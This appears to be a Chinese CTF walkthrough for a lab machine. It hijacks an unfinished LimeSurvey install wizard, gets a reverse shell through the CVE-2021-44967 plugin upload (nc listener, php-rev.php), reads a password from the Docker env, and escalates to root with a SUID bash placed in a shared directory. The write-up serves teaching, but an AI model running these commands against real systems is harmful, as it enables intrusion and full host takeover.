Phase 1

立足点：帮靶机装好 LimeSurvey → 插件 RCE

🧒 儿童版 — 餐厅没厨房，你搭一个 LimeSurvey 就像一家新开的餐厅（网站），需要一个厨房（数据库）才能运营。但这家餐厅自己没有厨房！安装向导允许你填一个"外部厨房地址"。于是你在自己家里搭了个厨房（Docker MySQL），把地址告诉餐厅，餐厅就用你的厨房完成了装修——然后你就拿到了管理员权限。

攻击机搭建 MySQL

$ sudo docker run -d -p 3306:3306 --rm --name tmp-mysql \
  -e MYSQL_ROOT_PASSWORD=password mysql:latest

在安装向导中填写攻击机 IP 作为数据库地址，完成安装并设管理员 admin:password。

LimeSurvey CVE-2021-44967 插件上传 RCE

$ git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git
# 编辑 config.xml 添加 <version>6.0</version>
# 编辑 php-rev.php 设置攻击机 IP/端口
$ zip Y1LD1R1M.zip config.xml php-rev.php

# Plugin Manager → Upload & Install
$ nc -lvnp 10001
$ curl http://10.129.234.81/survey/upload/plugins/Y1LD1R1M/php-rev.php

Phase 2

横向移动：Docker 环境变量泄露密码

limesvc@efaa6f5097ed:$ env
LIMESURVEY_PASS=5W5HN4K4GCXf9E
🧒 儿童版 — 容器里 env 是必查项 Docker 容器里的密码经常通过环境变量传入（Docker 标准做法）。拿到容器 shell 后第一件事就是运行 env，看看有没有密码、API Key 之类的敏感信息。 
$ ssh limesvc@10.129.234.81
Password: 5W5HN4K4GCXf9E
limesvc@forgotten:~$ cat user.txt

Phase 3

权限提升：Docker 共享目录 SUID bash

# 容器内确认共享目录
$ findmnt | grep survey
/var/www/html/survey  /dev/root[/opt/limesurvey]
🧒 儿童版 — 容器里 root 改权限，宿主机上用 容器和宿主机共享了一个文件夹。在容器里我们有 sudo 权限（可以变 root），宿主机上没有。在容器里用 root 权限复制一个 bash 并设置 SUID 权限，它会出现在宿主机的共享目录里——而且 SUID 权限保留着！ 
# 容器内（sudo su 变成 root）
# cd /var/www/html/survey
# cp /bin/bash .
# chmod +s bash

# 宿主机上
limesvc@forgotten:/opt/limesurvey$ ./bash -p
bash-5.1# cat /root/root.txt
bf3ea819836ecb51b9e03d6adce1f760

知识点总结

半成品应用是攻击面。

安装向导没有认证保护，你可以帮它"装好"并自己设管理员密码。连外部数据库也行。

Docker 容器枚举优先级。

拿到容器 shell 后立刻检查 env（环境变量）、hostname、/proc/1/cgroup、findmnt（挂载点）。

共享目录 SUID 逃逸。

容器内用 root 创建 SUID bash → 宿主机执行 ./bash -p → root。关键前提：容器内必须先变成 root。

帮装 LimeSurvey → 插件 RCE→env 泄露密码 → SSH→共享目录 SUID bash → root
